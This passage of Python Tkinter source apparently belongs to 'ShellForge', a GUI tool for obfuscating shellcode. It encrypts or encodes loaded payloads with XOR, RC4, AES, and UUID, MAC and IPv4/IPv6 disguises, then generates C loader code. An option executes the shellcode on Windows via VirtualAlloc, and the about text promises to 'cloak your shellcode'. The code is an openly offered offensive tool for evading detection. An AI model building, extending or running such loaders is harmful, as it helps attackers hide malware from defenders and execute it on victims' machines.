        self.info_text = tk.Text(info_frame, height=5, state='disabled', font=('Consolas', 9), background='#2d2d2d', foreground='#cccccc')
        self.info_text.pack(fill=tk.X)

        # Hex preview
        self.hex_frame = ttk.LabelFrame(left_frame, text="Hex Preview", padding=5)
        self.hex_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        hex_text_frame = ttk.Frame(self.hex_frame)
        hex_text_frame.pack(fill=tk.BOTH, expand=True)
        self.hex_text = tk.Text(hex_text_frame, height=8, font=('Consolas', 9), wrap=tk.NONE, background='#1e1e1e', foreground='#d4d4d4')
        v_scroll = ttk.Scrollbar(hex_text_frame, orient=tk.VERTICAL, command=self.hex_text.yview)
        h_scroll = ttk.Scrollbar(hex_text_frame, orient=tk.HORIZONTAL, command=self.hex_text.xview)
        self.hex_text.configure(yscrollcommand=v_scroll.set, xscrollcommand=h_scroll.set)
        self.hex_text.grid(row=0, column=0, sticky='nsew')
        v_scroll.grid(row=0, column=1, sticky='ns')
        h_scroll.grid(row=1, column=0, sticky='ew')
        hex_text_frame.grid_rowconfigure(0, weight=1)
        hex_text_frame.grid_columnconfigure(0, weight=1)

        # Options toggles
        toggle_frame = ttk.LabelFrame(left_frame, text="Options", padding=5)
        toggle_frame.pack(fill=tk.X, pady=5)
        self.execute_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(toggle_frame, text="Execute after print (Windows, VirtualAlloc)",
                        variable=self.execute_var).pack(anchor='w')

        # Right panel
        right_frame = ttk.Frame(main_pane)
        main_pane.add(right_frame, weight=3)

        # Notebook
        self.notebook = ttk.Notebook(right_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=5)

        self.techniques = [
            ("XOR", generate_xor_c, {'key': True}),
            ("Complex XOR", generate_complex_xor_c, {'key': True}),
            ("RC4", generate_rc4_c, {'key': True}),
            ("AES", generate_aes_c, {'key': True, 'iv': True}),
            ("UUID", generate_uuid_c, {}),
            ("MAC", generate_mac_c, {}),
            ("IPv4", generate_ipv4_c, {}),
            ("IPv6", generate_ipv6_c, {}),
            ("RC4+UUID", generate_combined_rc4_uuid_c, {'key': True}),
            ("AES+UUID", generate_combined_aes_uuid_c, {'key': True, 'iv': True}),
            ("XOR+Base64", generate_combined_xor_base64_c, {'key': True}),
            ("XOR+IPv4", generate_combined_xor_ipv4_c, {'key': True}),
            ("XOR+IPv6", generate_combined_xor_ipv6_c, {'key': True}),
            ("AES+IPv6", generate_combined_aes_ipv6_c, {'key': True, 'iv': True}),
            ("RC4+MAC", generate_combined_rc4_mac_c, {'key': True}),
        ]
        self.tabs = {}
        for name, func, key_info in self.techniques:
            tab = ttk.Frame(self.notebook)
            self.notebook.add(tab, text=name)
            self.tabs[name] = {"frame": tab, "func": func, "key_info": key_info,
                               "key_vars": {}, "full_code": None, "save_btn": None}

            if key_info:
                key_frame = ttk.LabelFrame(tab, text="Keys / IV", padding=5)
                key_frame.pack(fill=tk.X, padx=5, pady=5)
                row = 0
                if key_info.get('key', False):
                    ttk.Label(key_frame, text="Key (hex):").grid(row=row, column=0, sticky='w', padx=2)
                    key_var = tk.StringVar()
                    ttk.Entry(key_frame, textvariable=key_var, width=40).grid(row=row, column=1, padx=2)
                    ttk.Button(key_frame, text="Random", command=lambda n=name, k='key': self.randomize_key(n, k)).grid(row=row, column=2, padx=2)
                    self.tabs[name]['key_vars']['key'] = key_var
                    row += 1
                if key_info.get('iv', False):
                    ttk.Label(key_frame, text="IV (hex):").grid(row=row, column=0, sticky='w', padx=2)
                    iv_var = tk.StringVar()
                    ttk.Entry(key_frame, textvariable=iv_var, width=40).grid(row=row, column=1, padx=2)
                    ttk.Button(key_frame, text="Random", command=lambda n=name, k='iv': self.randomize_key(n, k)).grid(row=row, column=2, padx=2)
                    self.tabs[name]['key_vars']['iv'] = iv_var
                    row += 1

            text_frame = ttk.Frame(tab)
            text_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            text = CustomText(text_frame, wrap=tk.NONE, font=("Consolas", 10) if os.name == "nt" else ("Courier", 10),
                              background='#1e1e1e', foreground='#d4d4d4', insertbackground='white')
            v_scroll2 = ttk.Scrollbar(text_frame, orient=tk.VERTICAL, command=text.yview)
            h_scroll2 = ttk.Scrollbar(text_frame, orient=tk.HORIZONTAL, command=text.xview)
            text.configure(yscrollcommand=v_scroll2.set, xscrollcommand=h_scroll2.set)
            text.grid(row=0, column=0, sticky='nsew')
            v_scroll2.grid(row=0, column=1, sticky='ns')
            h_scroll2.grid(row=1, column=0, sticky='ew')
            text_frame.grid_rowconfigure(0, weight=1)
            text_frame.grid_columnconfigure(0, weight=1)
            self.tabs[name]["text"] = text

            preview_frame = ttk.LabelFrame(tab, text="Encoded Data Preview (first 10 items)", padding=5)
            preview_frame.pack(fill=tk.X, padx=5, pady=5)
            self.tabs[name]["preview"] = tk.Text(preview_frame, height=4, font=('Consolas', 9), background='#2d2d2d', foreground='#cccccc', state='disabled')
            self.tabs[name]["preview"].pack(fill=tk.X)

            button_frame = ttk.Frame(tab)
            button_frame.pack(pady=5)
            ttk.Button(button_frame, text="Forge Code", command=lambda n=name: self.generate_code(n)).pack(side=tk.LEFT, padx=2)
            ttk.Button(button_frame, text="Copy Code", command=lambda n=name: self.copy_tab_code(n)).pack(side=tk.LEFT, padx=2)
            self.tabs[name]["save_btn"] = ttk.Button(button_frame, text="Save Full Code...", command=lambda n=name: self.save_full_code(n))
            self.tabs[name]["save_btn"].pack_forget()

        self.notebook.bind('<<NotebookTabChanged>>', self.on_tab_change)

    def on_tab_change(self, event=None):
        tab_name = self.notebook.tab(self.notebook.select(), "text")
        self.update_hex_preview()
        self.update_tab_preview(tab_name)

    def update_hex_preview(self):
        if not self.show_hex.get() or not self.shellcode:
            return
        self.hex_text.delete(1.0, tk.END)
        hex_str = binascii.hexlify(self.shellcode).decode('ascii')
        lines = [hex_str[i:i+64] for i in range(0, len(hex_str), 64)]
        self.hex_text.insert(1.0, '\n'.join(lines))

    def toggle_hex_preview(self):
        if self.show_hex.get():
            self.hex_frame.pack(fill=tk.BOTH, expand=True, pady=5)
            self.update_hex_preview()
        else:
            self.hex_frame.pack_forget()

    def load_file(self):
        path = filedialog.askopenfilename(initialdir=self.last_dir, filetypes=[("Binary files", "*.bin"), ("All files", "*.*")])
        if path:
            self.last_dir = os.path.dirname(path)
            with open(path, "rb") as f:
                self.shellcode = f.read()
            self.filename.set(path)
            self.update_shellcode_info()
            self.update_hex_preview()
            current = self.notebook.tab(self.notebook.select(), "text")
            self.update_tab_preview(current)
            self.update_status(f"Loaded {len(self.shellcode)} bytes")

    def load_hex(self):
        hex_str = simpledialog.askstring("Load from Hex", "Enter hex string (without spaces):")
        if hex_str:
            try:
                self.shellcode = binascii.unhexlify(hex_str)
                self.filename.set("[hex input]")
                self.update_shellcode_info()
                self.update_hex_preview()
                current = self.notebook.tab(self.notebook.select(), "text")
                self.update_tab_preview(current)
                self.update_status(f"Loaded {len(self.shellcode)} bytes from hex")
            except Exception as e:
                messagebox.showerror("Error", f"Invalid hex: {e}")

    def update_shellcode_info(self):
        if not self.shellcode:
            return
        self.info_text.config(state='normal')
        self.info_text.delete(1.0, tk.END)
        md5 = hashlib.md5(self.shellcode).hexdigest()
        sha256 = hashlib.sha256(self.shellcode).hexdigest()
        info = f"Size: {len(self.shellcode)} bytes\nMD5: {md5}\nSHA256: {sha256[:32]}...\n"
        self.info_text.insert(1.0, info)
        self.info_text.config(state='disabled')

    def randomize_key(self, tab_name, key_type):
        if tab_name not in self.tabs:
            return
        if key_type == 'key':
            length = 16 if 'AES' in tab_name or 'RC4' in tab_name or 'Complex' in tab_name else 4
            new_key = os.urandom(length)
            hex_str = binascii.hexlify(new_key).decode('ascii')
            self.tabs[tab_name]['key_vars']['key'].set(hex_str)
        elif key_type == 'iv':
            new_iv = os.urandom(16)
            hex_str = binascii.hexlify(new_iv).decode('ascii')
            self.tabs[tab_name]['key_vars']['iv'].set(hex_str)

    def randomize_all_keys(self):
        for tab_name, tab in self.tabs.items():
            if 'key' in tab['key_vars']:
                self.randomize_key(tab_name, 'key')
            if 'iv' in tab['key_vars']:
                self.randomize_key(tab_name, 'iv')
        self.update_status("All keys randomized")

    def update_tab_preview(self, tab_name):
        if not self.shellcode:
            return
        tab = self.tabs.get(tab_name)
        if not tab:
            return
        preview_text = tab["preview"]
        preview_text.config(state='normal')
        preview_text.delete(1.0, tk.END)
        try:
            if tab_name == "UUID":
                data = uuid_encode(self.shellcode)
                label = "UUIDs"
            elif tab_name == "MAC":
                data = mac_encode(self.shellcode)
                label = "MACs"
            elif tab_name == "IPv4":
                data = ipv4_encode(self.shellcode)
                label = "IPv4"
            elif tab_name == "IPv6":
                data = ipv6_encode(self.shellcode)
                label = "IPv6"
            elif "UUID" in tab_name:
                enc, _ = self._get_encrypted_data(tab_name)
                data = uuid_encode(enc)
                label = "UUIDs (encrypted)"
            elif "MAC" in tab_name:
                enc, _ = self._get_encrypted_data(tab_name)
                data = mac_encode(enc)
                label = "MACs (encrypted)"
            elif "IPv4" in tab_name:
                enc, _ = self._get_encrypted_data(tab_name)
                data = ipv4_encode(enc)
                label = "IPv4 (encrypted)"
            elif "IPv6" in tab_name:
                enc, _ = self._get_encrypted_data(tab_name)
                data = ipv6_encode(enc)
                label = "IPv6 (encrypted)"
            elif "Base64" in tab_name:
                enc, _ = self._get_encrypted_data(tab_name)
                b64 = base64_encode(enc)
                preview_text.insert(tk.END, f"Base64: {b64[:200]}{'...' if len(b64)>200 else ''}")
                preview_text.config(state='disabled')
                return
            else:
                enc, _ = self._get_encrypted_data(tab_name)
                hex_str = binascii.hexlify(enc).decode('ascii')
                preview_text.insert(tk.END, f"Encrypted hex (first 200 chars):\n{hex_str[:200]}...")
                preview_text.config(state='disabled')
                return

            preview = data[:10]
            total = len(data)
            lines = '\n'.join(preview)
            preview_text.insert(tk.END, f"{label} ({total} total):\n{lines}")
            if total > 10:
                preview_text.insert(tk.END, f"\n... and {total-10} more")
        except Exception as e:
            preview_text.insert(tk.END, f"Preview error: {e}")
        preview_text.config(state='disabled')

    def _get_encrypted_data(self, tab_name):
        if not self.shellcode:
            return None, None
        tab = self.tabs[tab_name]
        key = None
        iv = None
        if 'key' in tab['key_vars']:
            key_hex = tab['key_vars']['key'].get().strip()
            if key_hex:
                key = binascii.unhexlify(key_hex)
        if 'iv' in tab['key_vars']:
            iv_hex = tab['key_vars']['iv'].get().strip()
            if iv_hex:
                iv = binascii.unhexlify(iv_hex)
        if tab_name in ("XOR", "Complex XOR", "XOR+Base64", "XOR+IPv4", "XOR+IPv6"):
            if "Complex" in tab_name:
                enc, _ = complex_xor_encrypt(self.shellcode, key)
            else:
                enc, _ = xor_encrypt(self.shellcode, key)
        elif "RC4" in tab_name:
            enc, _ = rc4_encrypt(self.shellcode, key)
        elif "AES" in tab_name:
            if not CRYPTO_AVAILABLE:
                enc = self.shellcode
            else:
                enc, _, _ = aes_encrypt(self.shellcode, key, iv)
        else:
            enc = self.shellcode
        return enc, key

    def generate_code(self, tab_name):
        if not self.shellcode:
            messagebox.showwarning("No shellcode", "Please load a binary file.")
            return
        tab = self.tabs[tab_name]
        func = tab['func']
        kwargs = {"shellcode": self.shellcode, "execute": self.execute_var.get()}
        if 'key' in tab['key_vars']:
            key_hex = tab['key_vars']['key'].get().strip()
            if key_hex:
                kwargs['custom_key'] = binascii.unhexlify(key_hex)
        if 'iv' in tab['key_vars']:
            iv_hex = tab['key_vars']['iv'].get().strip()
            if iv_hex:
                kwargs['custom_iv'] = binascii.unhexlify(iv_hex)
        code = func(**kwargs)
        tab['full_code'] = code
        text_widget = tab['text']
        text_widget.delete(1.0, tk.END)
        if len(code) > MAX_PREVIEW_CHARS:
            preview = code[:MAX_PREVIEW_CHARS]
            text_widget.insert(tk.END, preview)
            text_widget.insert(tk.END, f"\n\n... (truncated – {len(code)-MAX_PREVIEW_CHARS} more characters)\n")
            text_widget.insert(tk.END, "Use 'Save Full Code' button or 'Copy Code' to get the whole file.")
            tab['save_btn'].pack(side=tk.LEFT, padx=2)
        else:
            text_widget.insert(tk.END, code)
            tab['save_btn'].pack_forget()
        text_widget.highlight_syntax()
        self.update_status(f"Forged {tab_name} code ({len(code)} chars)" +
                           (" [execute ON]" if self.execute_var.get() else ""))

    def copy_tab_code(self, tab_name):
        tab = self.tabs.get(tab_name)
        if tab and tab['full_code']:
            self.root.clipboard_clear()
            self.root.clipboard_append(tab['full_code'])
            self.update_status(f"Copied {tab_name} code")

    def copy_current_code(self):
        tab_name = self.notebook.tab(self.notebook.select(), "text")
        self.copy_tab_code(tab_name)

    def save_current_code(self):
        tab_name = self.notebook.tab(self.notebook.select(), "text")
        tab = self.tabs.get(tab_name)
        if not tab or not tab['full_code']:
            messagebox.showinfo("No code", "Generate code first.")
            return
        file_path = filedialog.asksaveasfilename(initialdir=self.last_dir, defaultextension=".c",
                                                 filetypes=[("C files", "*.c"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as f:
                f.write(tab['full_code'])
            self.update_status(f"Saved to {os.path.basename(file_path)}")

    def save_full_code(self, tab_name):
        self.save_current_code()

    def export_as(self):
        tab_name = self.notebook.tab(self.notebook.select(), "text")
        tab = self.tabs.get(tab_name)
        if not tab or not tab['full_code']:
            messagebox.showinfo("No code", "Generate code first.")
            return
        file_path = filedialog.asksaveasfilename(initialdir=self.last_dir,
                                                 filetypes=[("C files", "*.c"), ("Python", "*.py"),
                                                            ("PowerShell", "*.ps1"), ("Raw text", "*.txt"),
                                                            ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as f:
                f.write(tab['full_code'])
            self.update_status(f"Exported to {os.path.basename(file_path)}")

    def clear_current_code(self):
        tab_name = self.notebook.tab(self.notebook.select(), "text")
        self.tabs[tab_name]['text'].delete(1.0, tk.END)
        self.tabs[tab_name]['full_code'] = None
        self.update_status(f"Cleared {tab_name} code")

    def show_about(self):
        about = """ShellForge – Obfuscation Arsenal v5.1
Pure extraction with optional execution.
15 techniques to cloak your shellcode inside:
- XOR (basic & complex feedback)
- RC4, AES
- UUID, MAC, IPv4, IPv6
- Combos like RC4+UUID, AES+IPv6, XOR+Base64...
All generated C code decrypts and prints the shellcode in hex.
Use the 'Execute after print' checkbox to run the shellcode on Windows.
"""
        messagebox.showinfo("About ShellForge", about)

    def update_status(self, msg):
        self.root.statusbar.config(text=f"  {msg}")

if __name__ == "__main__":
    root = tk.Tk()
    root.statusbar = ttk.Label(root, text=" Ready", relief=tk.SUNKEN, anchor=tk.W)
    root.statusbar.pack(side=tk.BOTTOM, fill=tk.X)
    app = ShellcodeObfuscatorApp(root)
    root.mainloop()